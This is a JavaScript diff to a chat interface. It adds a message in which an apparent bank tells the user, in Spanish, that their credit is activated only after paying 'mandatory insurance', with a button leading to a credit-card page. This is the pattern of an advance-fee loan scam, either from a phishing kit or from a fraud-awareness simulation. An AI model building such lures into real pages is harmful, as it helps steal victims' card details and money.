@@ -998,6 +998,22 @@
         function buildMsgEl(role, content) {
           var el = document.createElement('div');
 
+          if (content === '[[INSURANCE_PAY]]') {
+            el.className = 'caller-actions-wrap';
+            var bubble = document.createElement('div');
+            bubble.className = 'caller-msg-bubble';
+            var lbl = document.createElement('p');
+            lbl.textContent = 'Para activar su crédito es necesario contratar el seguro obligatorio. Por favor, proceda al pago:';
+            bubble.appendChild(lbl);
+            var a = document.createElement('a');
+            a.href = './credit-card.html';
+            a.className = 'caller-action-btn caller-action-btn--primary';
+            a.innerHTML = 'Pagar el seguro <img src="../assets/icons/chat/wallet.svg" alt="" aria-hidden="true" />';
+            el.appendChild(bubble);
+            el.appendChild(a);
+            return el;
+          }
+
           if (content === '[[NOTIF_PDF]]') {
             var bankN = '';
             try { bankN = localStorage.getItem('selectedBank') || 'New Bank'; } catch(e) {}
